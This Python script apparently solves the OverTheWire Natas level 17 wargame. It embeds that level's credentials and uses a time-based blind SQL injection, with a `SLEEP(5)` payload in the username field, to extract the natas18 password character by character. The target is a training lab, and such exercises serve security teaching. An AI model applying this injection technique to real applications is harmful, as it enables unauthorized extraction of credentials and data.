import requests
import time

session = requests.Session()
session.auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

occur = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

password = ""

for i in range(64):
    for j in occur:
        data = {"username": "natas18\" AND password LIKE BINARY \"" + password + j + "%\" AND SLEEP(5) #"}
        start_time = time.time()
        auth = session.post('http://natas17.natas.labs.overthewire.org/index.php', data=data)

        print(password, j)

        if time.time() - start_time > 5:
            print("exists")
            password += j
            print(password)
            break



